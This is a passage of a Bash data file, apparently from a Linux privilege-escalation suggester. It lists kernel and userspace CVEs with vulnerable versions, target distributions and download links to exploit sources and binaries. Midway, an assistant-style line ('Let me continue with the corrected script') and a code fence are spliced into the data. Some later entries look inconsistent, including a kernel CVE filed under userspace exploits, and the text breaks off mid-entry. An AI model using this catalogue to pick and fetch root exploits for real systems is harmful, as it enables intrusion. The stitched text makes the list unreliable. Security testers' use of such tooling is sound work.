Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.13,cmd:grep -qi rds /proc/modules,x86_64
Tags: ubuntu=16.04{kernel:4.4.0|4.8.0}
Rank: 1
src-url: https://gist.githubusercontent.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4/raw/959325819c78248a6437102bb289bb8578a135cd/cve-2018-5333-poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-5333/cve-2018-5333.c
author: wbowling (orginal); bcoles (update)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-14634]${txtrst} Mutagen Astronomy
Reqs: pkg=linux-kernel,ver>=4.14.1,ver<=4.14.54,x86_64
Tags: debian=8,RHEL=6|7
Rank: 1
analysis-url: https://www.qualys.com/2018/09/25/cve-2018-14634/mutagen-astronomy-integer-overflow-linux-create_elf_tables-cve-2018-14634.txt
exploit-db: 45516
author: Qualys
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-18955]${txtrst} subuid_shell
Reqs: pkg=linux-kernel,ver>=4.15,ver<=4.19.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,cmd:[ -u /usr/bin/newuidmap ],cmd:[ -u /usr/bin/newgidmap ]
Tags: ubuntu=18.04{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
exploit-db: 45886
author: Jann Horn
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-13272]${txtrst} PTRACE_TRACEME
Reqs: pkg=linux-kernel,ver>=4,ver<5.1.17,sysctl:kernel.yama.ptrace_scope==0,x86_64
Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
exploit-db: 47133
exploit-db: 47163
author: Jann Horn (orginal); bcoles (update)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-15666]${txtrst} XFRM_UAF
Reqs: pkg=linux-kernel,ver>=3,ver<5.0.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,CONFIG_XFRM=y
Tags:
Rank: 1
analysis-url: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
bin-url: https://github.com/duasynt/xfrm_poc/raw/master/lucky0
author: Vitaly 'vnik' Nikolenko
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-27365]${txtrst} linux-iscsi
Reqs: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y
Tags: RHEL=8
Rank: 1
analysis-url: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
src-url: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
author: GRIMM
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-3490]${txtrst} eBPF ALU32
Reqs: pkg=linux-kernel,ver>=5.7,ver<5.12,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
Rank: 5
analysis-url: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
src-url: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
author: chompie1337
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-3493]${txtrst} Ubuntu OverlayFS
Reqs: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64
Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10)
Rank: 1
analysis-url: https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/
src-url: https://raw.githubusercontent.com/briskets/CVE-2021-3493/refs/heads/main/exploit.c
author: ssd-disclosure
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-22555]${txtrst} Netfilter OOB
Reqs: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6
Tags: ubuntu=20.04{kernel:5.8.0-*}
Rank: 1
analysis-url: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
src-url: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
exploit-db: 50135
author: theflow (orginal); bcoles (update)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2022-0847]${txtrst} DirtyPipe
Reqs: pkg=linux-kernel,ver>=5.8,ver<=5.16.11
Tags: ubuntu=(20.04|21.04),debian=11
Rank: 1
analysis-url: https://dirtypipe.cm4all.com/
src-url: https://haxx.in/files/dirtypipez.c
exploit-db: 50808
author: blasty (original: Max Kellermann)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2022-0995]${txtrst} watch_queue
Reqs: pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64
Tags: ubuntu=21.10{kernel:5.13.0.37-generic}
Rank: 1
analysis-url: https://github.com/Bonfee/CVE-2022-0995
src-url: https://github.com/Bonfee/CVE-2022-0995/archive/refs/heads/main.zip
author: Bonfee (vuln discovery: Jann Horn)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2022-2586]${txtrst} nft_object UAF
Reqs: pkg=linux-kernel,ver>=3.16,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=(20.04){kernel:5.12.13}
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2022/08/29/5
src-url: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
author: vuln: Team Orca Sea Security; exploit: Alejandro Guerrero
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2022-32250]${txtrst} nft_object UAF (NFT_MSG_NEWSET)
Reqs: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
Rank: 1
analysis-url: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
src-url: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
author: vuln: EDG Team NCC Group; exploit: theori.io
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2023-0386]${txtrst} OverlayFS suid smuggle
Reqs: pkg=linux-kernel,ver>=5.11,ver<=6.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=22.04.1{kernel:5.15.0-57-generic}
Rank: 1
analysis-url: https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/
src-url: https://github.com/xkaneiki/CVE-2023-0386/archive/refs/heads/main.zip
author: vuln: Miklos Szeredi; exploit: xkaneiki
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2024-1086]${txtrst} double-free nf_tables
Reqs: pkg=linux-kernel,x86_64,ver>=5.14,ver<=6.6,CONFIG_NF_TABLES=y,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: debian=12,ubuntu=22.04
Rank: 1
analysis-url: https://pwning.tech/nftables/
src-url: https://github.com/Notselwyn/CVE-2024-1086/archive/refs/heads/main.zip
author: notselwyn
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2025-7771]${txtrst} linux kernel LPE
Reqs: pkg=linux-kernel,ver>=6.1,ver<=6.8
Tags:
Rank: 1
src-url: https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2025-7771/exploit.c
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2026-31431]${txtrst} Copy Fail LPE
Reqs: pkg=linux-kernel,ver>=6.6,ver<=6.12
Tags:
Rank: 1
src-url: https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-31431/exploit.c
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2026-43500]${txtrst} Dirty Frag lutil LPE
Reqs: pkg=linux-kernel,ver>=6.8,ver<=6.14
Tags:
Rank: 1
src-url: https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-43500/poc.c
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2024-26809]${txtrst} OtterRoot (netfilter)
Reqs: pkg=linux-kernel,ver>=6.1,ver<=6.8,CONFIG_NF_TABLES=y,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags:
Rank: 1
analysis-url: https://www.sentinelone.com/vulnerability-database/cve-2024-26809/
src-url: https://github.com/otterroot/exploit/archive/main.zip
author: Pedro Pinto
EOF
)

n=0

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-0186]${txtrst} samba
Reqs: pkg=samba,ver<=2.2.8
Tags:
Rank: 1
exploit-db: 23674
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-1185]${txtrst} udev
Reqs: pkg=udev,ver<141,cmd:[[ -f /etc/udev/rules.d/95-udev-late.rules || -f /lib/udev/rules.d/95-udev-late.rules ]]
Tags: ubuntu=8.10|9.04
Rank: 1
exploit-db: 8572
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-1185]${txtrst} udev 2
Reqs: pkg=udev,ver<141
Tags:
Rank: 1
exploit-db: 8478
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-0832]${txtrst} PAM MOTD
Reqs: pkg=libpam-modules,ver<=1.1.1
Tags: ubuntu=9.10|10.04
Rank: 1
exploit-db: 14339
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-4170]${txtrst} SystemTap
Reqs: pkg=systemtap,ver<=1.3
Tags: RHEL=5{systemtap:1.1-3.el5},fedora=13{systemtap:1.2-1.fc13}
Rank: 1
author: Tavis Ormandy
exploit-db: 15620
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2011-1485]${txtrst} pkexec
Reqs: pkg=polkit,ver=0.96
Tags: RHEL=6,ubuntu=10.04|10.10
Rank: 1
exploit-db: 17942
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2011-2921]${txtrst} ktsuss
Reqs: pkg=ktsuss,ver<=1.4
Tags: sparky=5|6
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2011/08/13/2
src-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2011-2921/ktsuss-lpe.sh
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2012-0809]${txtrst} death_star (sudo)
Reqs: pkg=sudo,ver>=1.8.0,ver<=1.8.3
Tags: fedora=16
Rank: 1
analysis-url: http://seclists.org/fulldisclosure/2012/Jan/att-590/advisory_sudo.txt
exploit-db: 18436
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0476]${txtrst} chkrootkit
Reqs: pkg=chkrootkit,ver<0.50
Tags:
Rank: 1
analysis-url: http://seclists.org/oss-sec/2014/q2/430
exploit-db: 33899
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-5119]${txtrst} __gconv_translit_find
Reqs: pkg=glibc|libc6,x86
Tags: debian=6
Rank: 1
analysis-url: http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/34421.tar.gz
exploit-db: 34421
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1862]${txtrst} newpid (abrt)
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: fedora=20
Rank: 1
analysis-url: http://openwall.com/lists/oss-security/2015/04/14/4
src-url: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
exploit-db: 36746
EOF
)

Let me continue with the corrected script. I'll pick up from the userspace exploits and complete the rest.

```bash
EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3202]${txtrst} fuse (fusermount)
Reqs: pkg=fuse,ver<2.9.3
Tags: debian=7.0|8.0,ubuntu=*
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/520
exploit-db: 37089
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1815]${txtrst} setroubleshoot
Reqs: pkg=setroubleshoot,ver<3.2.22
Tags: fedora=21
Rank: 1
exploit-db: 36564
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3246]${txtrst} userhelper
Reqs: pkg=libuser,ver<=0.60
Tags: RHEL=6{libuser:0.56.13-(4|5).el6},RHEL=6{libuser:0.60-5.el7},fedora=13|19|20|21|22
Rank: 1
analysis-url: https://www.qualys.com/2015/07/23/cve-2015-3245-cve-2015-3246/cve-2015-3245-cve-2015-3246.txt
exploit-db: 37706
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-5287]${txtrst} abrt/sosreport-rhel7
Reqs: pkg=abrt,cmd:grep -qi abrt /proc/sys/kernel/core_pattern
Tags: RHEL=7{abrt:2.1.11-12.el7}
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2015/12/01/1
src-url: https://www.openwall.com/lists/oss-security/2015/12/01/1/1
exploit-db: 38832
author: rebel
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-6565]${txtrst} not_an_sshnuke
Reqs: pkg=openssh-server,ver>=6.8,ver<=6.9
Tags:
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/01/26/2
exploit-db: 41173
author: Federico Bento
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-8612]${txtrst} blueman set_dhcp_handler
Reqs: pkg=blueman,ver<2.0.3
Tags: debian=8{blueman:1.23}
Rank: 1
analysis-url: https://twitter.com/thegrugq/status/677809527882813440
exploit-db: 46186
author: Sebastian Krahmer
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1240]${txtrst} tomcat-rootprivesc-deb
Reqs: pkg=tomcat
Tags: debian=8,ubuntu=16.04
Rank: 1
analysis-url: https://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
src-url: http://legalhackers.com/exploits/tomcat-rootprivesc-deb.sh
exploit-db: 40450
author: Dawid Golunski
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1247]${txtrst} nginxed-root
Reqs: pkg=nginx|nginx-full,ver<1.10.3
Tags: debian=8,ubuntu=14.04|16.04|16.10
Rank: 1
analysis-url: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
src-url: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
exploit-db: 40768
author: Dawid Golunski
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1531]${txtrst} perl_startup (exim)
Reqs: pkg=exim,ver<4.86.2
Tags:
Rank: 1
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
exploit-db: 39549
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-1531]${txtrst} perl_startup (exim) 2
Reqs: pkg=exim,ver<4.86.2
Tags:
Rank: 1
analysis-url: http://www.exim.org/static/doc/CVE-2016-1531.txt
exploit-db: 39535
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-4989]${txtrst} setroubleshoot 2
Reqs: pkg=setroubleshoot
Tags: RHEL=6|7
Rank: 1
analysis-url: https://c-skills.blogspot.com/2016/06/lets-feed-attacker-input-to-sh-c-to-see.html
src-url: https://github.com/stealth/troubleshooter/raw/master/straight-shooter.c
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-5425]${txtrst} tomcat-RH-root
Reqs: pkg=tomcat
Tags: RHEL=7
Rank: 1
analysis-url: http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
src-url: http://legalhackers.com/exploits/tomcat-RH-root.sh
exploit-db: 40488
author: Dawid Golunski
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-6663,CVE-2016-6664]${txtrst} mysql-exploit-chain
Reqs: pkg=mysql-server|mariadb-server,ver<5.5.52
Tags: ubuntu=16.04.1
Rank: 1
analysis-url: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
src-url: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
exploit-db: 40678
author: Dawid Golunski
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-9566]${txtrst} nagios-root-privesc
Reqs: pkg=nagios,ver<4.2.4
Tags:
Rank: 1
analysis-url: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html
src-url: https://legalhackers.com/exploits/CVE-2016-9566/nagios-root-privesc.sh
exploit-db: 40921
author: Dawid Golunski
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-0358]${txtrst} ntfs-3g-modprobe
Reqs: pkg=ntfs-3g,ver<2017.4
Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
exploit-db: 41356
author: Jann Horn
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-5899]${txtrst} s-nail-privget
Reqs: pkg=s-nail,ver<14.8.16
Tags: ubuntu=16.04,manjaro=16.10
Rank: 1
analysis-url: https://www.openwall.com/lists/oss-security/2017/01/27/7
src-url: https://www.openwall.com/lists/oss-security/2017/01/27/7/1
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh
author: wapiflapi; bcoles (update)
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000367]${txtrst} Sudoer-to-root
Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]
Tags: RHEL=7{sudo:1.8.6p7}
Rank: 1
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
src-url: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c
exploit-db: 42183
author: Qualys
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000367]${txtrst} sudopwn
Reqs: pkg=sudo,ver<=1.8.20,cmd:[ -f /usr/sbin/getenforce ]
Tags:
Rank: 1
analysis-url: https://www.sudo.ws/alerts/linux_tty.html
src-url: https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c
author: c0d3z3r0
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000370]${txtrst} linux_ldso_hwcap
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
exploit-db: 42274
author: Qualys
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000371]${txtrst} linux_ldso_dynamic
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags: debian=9|10,ubuntu=14.04.5|16.04.2|17.04,fedora=23|24|25
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
exploit-db: 42276
author: Qualys
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000366,CVE-2017-1000379]${txtrst} linux_ldso_hwcap_64
Reqs: pkg=glibc|libc6,ver<=2.25,x86_64
Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
exploit-db: 42275
author: Qualys
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000370,CVE-2017-1000371]${txtrst} linux_offset2lib
Reqs: pkg=glibc|libc6,ver<=2.25,x86
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
exploit-db: 42273
author: Qualys
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-1000001]${txtrst} RationalLove
Reqs: pkg=glibc|libc6,ver<2.27,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,x86_64
Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
Rank: 1
analysis-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
src-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
exploit-db: 43775
author: halfdog
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-10900]${txtrst} vpnc_privesc
Reqs: pkg=networkmanager-vpnc|network-manager-vpnc,ver<1.2.6
Tags: ubuntu=16.04{network-manager-vpnc:1.1.93-1},debian=9.0{network-manager-vpnc:1.2.4-4},manjaro=17
Rank: 1
analysis-url: https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc
src-url: https://bugzilla.novell.com/attachment.cgi?id=779110
exploit-db: 45313
author: Denis Andzakovic
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-14665]${txtrst} raptor_xorgy
Reqs: pkg=xorg-x11-server-Xorg,cmd:[ -u /usr/bin/Xorg ]
Tags: centos=7.4
Rank: 1
analysis-url: https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html
exploit-db: 45922
author: raptor
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-7304]${txtrst} dirty_sock
Reqs: pkg=snapd,ver<2.37,cmd:[ -S /run/snapd.socket ]
Tags: ubuntu=18.10,mint=19
Rank: 1
analysis-url: https://initblog.com/2019/dirty-sock/
src-url: https://github.com/initstring/dirty_sock/archive/master.zip
exploit-db: 46361
exploit-db: 46362
author: InitString
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-10149]${txtrst} raptor_exim_wiz
Reqs: pkg=exim|exim4,ver>=4.87,ver<=4.91
Tags:
Rank: 1
analysis-url: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
exploit-db: 46996
author: raptor
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-12181]${txtrst} Serv-U FTP Server
Reqs: cmd:[ -u /usr/local/Serv-U/Serv-U ]
Tags: debian=9
Rank: 1
analysis-url: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html
exploit-db: 47009
src-url: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c
ext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot
author: Guy Levin; bcoles (update)
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-18862]${txtrst} GNU Mailutils maidag
Reqs: cmd:[ -u /usr/local/sbin/maidag ]
Tags:
Rank: 1
analysis-url: https://www.mike-gualtieri.com/posts/finding-a-decade-old-flaw-in-gnu-mailutils
ext-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.cron.sh
src-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.ldpreload.sh
author: bcoles
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2019-18634]${txtrst} sudo pwfeedback
Reqs: pkg=sudo,ver<1.8.31
Tags: mint=19
Rank: 1
analysis-url: https://dylankatz.com/Analysis-of-CVE-2019-18634/
src-url: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
author: saleemrashid
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2020-9470]${txtrst} Wing FTP Server
Reqs: cmd:[ -x /etc/init.d/wftpserver ]
Tags: ubuntu=18
Rank: 1
analysis-url: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php
src-url: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh
exploit-db: 48154
author: Cary Cooper
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-3156]${txtrst} sudo Baron Samedit
Reqs: pkg=sudo,ver<1.9.5p2
Tags: mint=19,ubuntu=18|20,debian=10
Rank: 1
analysis-url: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
src-url: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
author: blasty
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-3156]${txtrst} sudo Baron Samedit 2
Reqs: pkg=sudo,ver<1.9.5p2
Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20,debian=9|10
Rank: 1
analysis-url: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
src-url: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
author: worawit
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-5618]${txtrst} setuid screen v4.5.0
Reqs: pkg=screen,ver==4.5.0
Tags:
Rank: 1
analysis-url: https://seclists.org/oss-sec/2017/q1/184
exploit-db: 41154
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2021-4034]${txtrst} PwnKit
Reqs: pkg=polkit|policykit-1,ver<=0.105-31
Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
Rank: 1
analysis-url: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
src-url: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
author: berdav
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2025-32463]${txtrst} sudo-chwoot
Reqs: pkg=sudo,ver>=1.9.14,ver<=1.9.17
Tags: ubuntu=24.04.1,fedora=41
Rank: 1
analysis-url: https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/
src-url: https://github.com/mirchr/CVE-2025-32463-sudo-chwoot/archive/refs/heads/main.zip
author: Rich Mirch
EOF
)

EXPLOITS_USERSPACE[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2026-46333]${txtrst} ptrace_may_access
Reqs: pkg=linux-kernel,ver>=4.10,ver<6.14
